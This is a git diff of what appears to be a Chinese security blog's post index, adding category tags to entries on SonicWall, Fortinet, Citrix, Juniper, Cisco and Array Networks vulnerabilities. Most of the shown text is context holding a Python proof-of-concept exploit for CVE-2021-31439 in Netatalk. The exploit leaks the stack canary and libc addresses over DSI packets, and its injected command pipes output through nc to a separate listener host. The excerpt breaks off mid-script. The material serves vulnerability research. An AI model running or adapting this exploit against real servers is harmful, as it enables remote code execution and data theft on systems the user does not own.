@@ -67,6 +67,9 @@
 <p><a href="https://wzt.ac.cn/2022/02/08/sonicwall_dec1/">https://wzt.ac.cn/2022/02/08/sonicwall_dec1/</a></p>
 <p><a href="https://wzt.ac.cn/2024/09/05/sonicwall_dec2/">https://wzt.ac.cn/2024/09/05/sonicwall_dec2/</a></p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>SonicOS 固件解密 (2)</title>
@@ -138,6 +141,9 @@
 <p><a class="link"   href="https://badmonkey.site/archives/sonicwall-sma-research" >https://badmonkey.site/archives/sonicwall-sma-research <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://www.gnu.org/software/grub/grub-download.html" >https://www.gnu.org/software/grub/grub-download.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>Draytek Vigor 3910 &amp; 2960 漏洞分析</title>
@@ -193,6 +199,9 @@
 <p>目前官方已经修复该漏洞，建议使用该设备的用户及时更新。</p>
 <h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>此类参数位置错误，以及对于不安全函数的使用在源码检查或编译阶段就应该被发现并纠正，希望开发者可以重视软件安全，防止恶意攻击造成用户隐私信息泄露和财产损失。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>搭建 FortiGate 调试环境 (二)</title>
@@ -404,6 +413,9 @@
 <p><a class="link"   href="https://zhuanlan.zhihu.com/p/438209486" >https://zhuanlan.zhihu.com/p/438209486 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://liwugang.github.io/2020/10/25/introduce_lsm.html" >https://liwugang.github.io/2020/10/25/introduce_lsm.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>Draytek Vigor 3910</title>
@@ -619,6 +631,9 @@
 <p><a class="link"   href="https://harmonyhu.com/2018/06/23/Arm-trusted-firmware/#bl1" >https://harmonyhu.com/2018/06/23/Arm-trusted-firmware/#bl1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://android.googlesource.com/platform/external/lz4/+/HEAD/doc/lz4_Frame_format.md" >https://android.googlesource.com/platform/external/lz4/+/HEAD/doc/lz4_Frame_format.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>逆向恢复 Protobuf 对象结构</title>
@@ -811,6 +826,9 @@
 <p><a class="link"   href="https://github.com/marin-m/pbtk" >https://github.com/marin-m/pbtk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://www.52pojie.cn/thread-1735973-1-1.html" >https://www.52pojie.cn/thread-1735973-1-1.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2023-4966</title>
@@ -897,10 +915,13 @@
 <p><a class="link"   href="https://support.citrix.com/article/CTX579459" >https://support.citrix.com/article/CTX579459 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://www.mandiant.com/resources/blog/remediation-netscaler-adc-gateway-cve-2023-4966" >https://www.mandiant.com/resources/blog/remediation-netscaler-adc-gateway-cve-2023-4966 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2023-36845 &amp; CVE-2023-36846</title>
-    <url>/2023/08/25/juniper202308/</url>
+    <url>/2023/08/25/CVE-2023-36845-36846/</url>
     <content><![CDATA[<p>2023 年 8 月，Juniper Networks 发布了影响 EX 和 SRX 中 J-Web 组件的远程代码执行漏洞相关信息，本次公开有 4 个漏洞，其中 CVE-2023-36845 &amp; CVE-2023-36846 影响 SRX 系列设备，本文对这两个漏洞进行分析。</p>
 <span id="more"></span>
 
@@ -960,6 +981,9 @@
 <p><a class="link"   href="https://www.elttam.com/blog/env/#content" >https://www.elttam.com/blog/env/#content <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://github.com/kljunowsky/CVE-2023-36845" >https://github.com/kljunowsky/CVE-2023-36845 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2023-25610</title>
@@ -1063,6 +1087,9 @@
 <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-23-001" >https://www.fortiguard.com/psirt/FG-IR-23-001 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://wanghenshui.github.io/2019/05/01/jemalloc.html" >https://wanghenshui.github.io/2019/05/01/jemalloc.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Cisco SPA112 固件解包/打包分析</title>
@@ -1136,6 +1163,9 @@
                 ></p>
 <p>本文我们简单分析了 Cisco SPA112 语音网关的漏洞，尝试使用厂商开源的 GPL 工具构造恶意固件，植入木马后获取代码执行权限。<a class="link"   href="https://github.com/rrrrrrri/spa112-tools" >相关工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>搭建 FortiGate 调试环境 (一)</title>
@@ -1269,6 +1299,9 @@
                 ></p>
 <p>本部分介绍了 FortiGate License 授权验证逻辑，分析了 License 组成结构和各字段大致含义，并编写了一个注册程序可以生成合适的 License。</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2022-27596</title>
@@ -1357,6 +1390,9 @@
 <p>CWE-89 的<a class="link"   href="https://cwe.mitre.org/data/definitions/89.html" >定义 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
 <p>第三方安全<a class="link"   href="https://www.secrss.com/articles/51499" >通告 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Array Networks vxAG 远程代码执行漏洞分析 (二)</title>
@@ -1573,6 +1609,9 @@
 <p><video controls height='100%' width='100%' src="/img/array_vxag2_01.mp4"></video></p>
 <p>本文介绍了关于 ArrayNetworks vxAG 设备 License 破解和 SSLVPN 远程代码执行的相关内容，文中还有一些细节需要解决，另外在新版中 webui_localdb_file 对输入的参数进行了过滤。如何在新版中实现提权？如何解决代码执行中的一些小问题？我们就留给读者去探索吧。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2022-42475</title>
@@ -1703,6 +1742,9 @@
 <p>2023 年 1 月 11 日，Fortinet 官方发布了关于积极利用该漏洞的组织，以及他们所使用工具的<a class="link"   href="https://www.fortinet.com/blog/psirt-blogs/analysis-of-fg-ir-22-398-fortios-heap-based-buffer-overflow-in-sslvpnd" >分析文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
 <p>2023 年 5 月 17 日，BishopFox 发布了一种更完整的利用此漏洞的<a class="link"   href="https://bishopfox.com/blog/exploit-cve-2022-42475" >文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Array Networks vxAG 远程代码执行漏洞分析 (一)</title>
@@ -1820,6 +1862,9 @@
 <p><video controls height='100%' width='100%' src="/img/array_vxag_05.mp4"></video></p>
 <p>本文内容到这里就结束了，我们将在下篇文章中介绍 License 和 VPN 的相关问题。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2021-31439</title>
@@ -1851,6 +1896,9 @@
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">R_HOST = <span class="string">&quot;192.168.152.133&quot;</span></span><br><span class="line">R_PORT = <span class="number">548</span></span><br><span class="line"></span><br><span class="line">SUPPORT_VERSION = [<span class="string">&quot;Netatalk3.1.12&quot;</span>]</span><br><span class="line"></span><br><span class="line">DSI_CloseSession     = <span class="number">0x01</span></span><br><span class="line">DSI_Common           = <span class="number">0x02</span></span><br><span class="line">DSI_FPGetSrvrInfo    = <span class="number">0x03</span></span><br><span class="line">DSI_OpenSession      = <span class="number">0x04</span></span><br><span class="line"></span><br><span class="line">MAX_RECV_LENGTH = <span class="number">4096</span></span><br><span class="line">DSI_SERVQUANT_DEF = <span class="number">0x100000</span></span><br><span class="line"></span><br><span class="line">nl_global_locale_padding_offset = <span class="number">0x102678</span></span><br><span class="line">dtor_list_padding_offset = <span class="number">0x1026b0</span></span><br><span class="line">tls_padding_length = <span class="number">0x1026f0</span>    <span class="comment"># padding to TLS</span></span><br><span class="line">nl_global_locale_offset = <span class="number">0x3c5420</span></span><br><span class="line">username_address = <span class="number">0x656190</span></span><br><span class="line">username = (<span class="string">&quot;iot&quot;</span>.ljust(<span class="number">16</span>, <span class="string">&quot;\x00&quot;</span>)).encode()</span><br><span class="line">command = <span class="string">b&quot;`uname -a | nc 192.168.152.129 31337`&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DSI</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, dsi_flags, dsi_command, dsi_requestID, dsi_dataOffset, dsi_len, dsi_reserved</span>):</span><br><span class="line">        self.dsi_flags = dsi_flags</span><br><span class="line">        self.dsi_command = dsi_command</span><br><span class="line">        self.dsi_requestID = dsi_requestID</span><br><span class="line">        self.dsi_dataOffset = dsi_dataOffset</span><br><span class="line">        self.dsi_len = dsi_len</span><br><span class="line">        self.dsi_reserved = dsi_reserved</span><br><span class="line"></span><br><span class="line">        self.header_length = <span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gen_packet</span>(<span class="params">self, data=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">        packet = <span class="string">b&quot;&quot;</span></span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!B&quot;</span>, self.dsi_flags)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!B&quot;</span>, self.dsi_command)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!H&quot;</span>, self.dsi_requestID)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_dataOffset)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_len)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_reserved)</span><br><span class="line">        packet += data</span><br><span class="line">        <span class="keyword">return</span> packet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_body_error_code</span>(<span class="params">packet</span>):</span><br><span class="line">    flags = packet[<span class="number">0</span>]</span><br><span class="line">    command = packet[<span class="number">1</span>]</span><br><span class="line">    request_id = packet[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    error_code = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, packet[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    length = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, packet[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]</span><br><span class="line">    reserved = packet[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    body = packet[<span class="number">16</span>:length + <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">if</span> length != <span class="built_in">len</span>(body):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Invalid packet length&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (error_code, body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_parse_srvInfo</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># https://github.com/rapid7/metasploit-framework/pull/216/files</span></span><br><span class="line">    error_code,body = _get_body_error_code(data)</span><br><span class="line"></span><br><span class="line">    machine_type_offset = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, body[<span class="number">0</span>:<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line">    version_count_offset = body[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    uam_count_offset = body[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">    icon_offset = body[<span class="number">6</span>:<span class="number">8</span>]</span><br><span class="line">    flags = body[<span class="number">8</span>:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">    server_name_length = body[<span class="number">10</span>]</span><br><span class="line">    server_name = body[<span class="number">11</span>:server_name_length + <span class="number">11</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got server name: %s&quot;</span> % server_name.decode())</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">10</span> + server_name_length + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> pos % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        pos += <span class="number">1</span>    <span class="comment"># padding</span></span><br><span class="line"></span><br><span class="line">    server_signature_offset = body[pos:pos + <span class="number">2</span>]</span><br><span class="line">    network_addresses_count_offset = body[pos + <span class="number">2</span>:pos + <span class="number">4</span>]</span><br><span class="line">    directory_names_count_offset = body[pos + <span class="number">4</span>:pos + <span class="number">6</span>]</span><br><span class="line">    utf8_server_name_offset = body[pos + <span class="number">6</span>:pos + <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    machine_type_length = body[machine_type_offset]</span><br><span class="line">    machine_type = body[pos + <span class="number">9</span>:pos + machine_type_length + <span class="number">9</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got machine type: %s&quot;</span> % machine_type.decode())</span><br><span class="line">    <span class="keyword">if</span> machine_type.decode() <span class="keyword">not</span> <span class="keyword">in</span> SUPPORT_VERSION:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Target not support.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># continue parse seems not necessary</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_parse_openSession</span>(<span class="params">data</span>):</span><br><span class="line">    error_code,body = _get_body_error_code(data)</span><br><span class="line">    <span class="keyword">if</span> error_code[<span class="number">0</span>] != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] OpenSession failed.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print(&quot;[+] OpenSession success&quot;)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_open_session</span>():</span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">         s.connect((R_HOST, R_PORT))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error connecting server&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print(&quot;[*] OpenSession&quot;)</span></span><br><span class="line">    _open_session_packet = DSI(<span class="number">0x0</span>, DSI_OpenSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_open_session_packet)</span><br><span class="line">    simple_parse_openSession(s.recv(MAX_RECV_LENGTH))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak_one</span>(<span class="params">sock, canary</span>):</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * tls_padding_length + <span class="string">b&quot;tcb__ptr&quot;</span> + <span class="string">b&quot;dtv__ptr&quot;</span> + <span class="string">b&quot;self_ptr&quot;</span> + <span class="string">b&quot;mult&quot;</span> + <span class="string">b&quot;scop&quot;</span> + <span class="string">b&quot;_sysinfo&quot;</span></span><br><span class="line">    payload += canary</span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    sock.send(_packet)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    data = sock.recv(MAX_RECV_LENGTH)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak</span>(<span class="params">n, canary</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] ==== Byte%d ====&quot;</span> % n)</span><br><span class="line">    _succ = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">        <span class="comment"># print(&quot;[*]     Trying &quot; + str(i))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock = connect_open_session()</span><br><span class="line">            _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, ((i &lt;&lt; (n * <span class="number">8</span>)) | canary))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> _leak_one(sock, _tmp):</span><br><span class="line">                canary = ((i &lt;&lt; <span class="number">8</span>) | canary)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sock.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got byte%d: %d&quot;</span> % (n, i))</span><br><span class="line">    <span class="comment"># if i == 0:</span></span><br><span class="line">    <span class="comment">#     print(&quot;[-] Error leaking canary. Try again&quot;)</span></span><br><span class="line">    <span class="comment">#     exit(0)</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_canary</span>():</span><br><span class="line">    canary = <span class="number">0x0</span>    <span class="comment"># canary lowest byte == 0x00</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Leaking canary (stable)...&quot;</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">1</span>, canary) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">2</span>, canary) &lt;&lt; <span class="number">16</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">3</span>, canary) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">4</span>, canary) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">5</span>, canary) &lt;&lt; <span class="number">40</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">6</span>, canary) &lt;&lt; <span class="number">48</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">7</span>, canary) &lt;&lt; <span class="number">56</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak_one2</span>(<span class="params">sock, value</span>):</span><br><span class="line">    payload = <span class="string">b&quot;\x00&quot;</span> * nl_global_locale_padding_offset</span><br><span class="line">    payload += value</span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _crash_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    sock.sendall(_crash_packet)</span><br><span class="line"></span><br><span class="line">    _close_packet = DSI(<span class="number">0x0</span>, DSI_CloseSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    sock.sendall(_close_packet)</span><br><span class="line">    sock.recv(MAX_RECV_LENGTH)</span><br><span class="line">    sock.send(<span class="string">b&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">    sock.recv(MAX_RECV_LENGTH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak2</span>(<span class="params">n, global_locale, _step=<span class="number">1</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] ==== Byte%d ====&quot;</span> % n)</span><br><span class="line">    vals = []</span><br><span class="line">    _succ = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x100</span>, _step):</span><br><span class="line">        <span class="comment"># print(&quot;[*]     Trying &quot; + str(i))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock = connect_open_session()</span><br><span class="line">            _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (((i) &lt;&lt; (n * <span class="number">8</span>)) | global_locale))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> _step == <span class="number">0x10</span>:</span><br><span class="line">                _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (((i + <span class="number">4</span>) &lt;&lt; (n * <span class="number">8</span>)) | global_locale))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># print(_tmp)</span></span><br><span class="line">            _leak_one2(sock, _tmp)</span><br><span class="line">            <span class="keyword">if</span> _step == <span class="number">0x10</span>:</span><br><span class="line">                vals.append(i + <span class="number">4</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                vals.append(i)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">return</span> vals</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    global_locale = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Leaking libc (unstable)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    byte0 = [<span class="number">0x20</span>]</span><br><span class="line">    byte1 = []</span><br><span class="line">    byte2 = []</span><br><span class="line">    byte3 = []</span><br><span class="line">    byte4 = []</span><br><span class="line">    byte5 = [<span class="number">0x7f</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte0&quot;</span> % <span class="built_in">len</span>(byte0))</span><br><span class="line">    <span class="keyword">for</span> m_byte0 <span class="keyword">in</span> byte0:</span><br><span class="line">        global_locale = global_locale | m_byte0</span><br><span class="line">        byte1 = _leak2(<span class="number">1</span>, global_locale, <span class="number">0x10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte1) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte0)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(byte1)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte1) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte1) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte1&quot;</span> % <span class="built_in">len</span>(byte1))</span><br><span class="line">    <span class="keyword">for</span> m_byte1 <span class="keyword">in</span> byte1:</span><br><span class="line">        global_locale = global_locale | (m_byte1 &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        byte2 = _leak2(<span class="number">2</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte2) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte1)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte2)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte2) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte2) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte2&quot;</span> % <span class="built_in">len</span>(byte2))</span><br><span class="line">    <span class="keyword">for</span> m_byte2 <span class="keyword">in</span> byte2:</span><br><span class="line">        global_locale = global_locale | (m_byte2 &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        byte3 = _leak2(<span class="number">3</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte3) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte2)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte3)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte3) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte3) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte3&quot;</span> % <span class="built_in">len</span>(byte3))</span><br><span class="line">    <span class="keyword">for</span> m_byte3 <span class="keyword">in</span> byte3:</span><br><span class="line">        global_locale = global_locale | (m_byte3 &lt;&lt; <span class="number">24</span>)</span><br><span class="line">        byte4 = _leak2(<span class="number">4</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte4) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte3)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">24</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte4)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte4) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte4) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte4&quot;</span> % <span 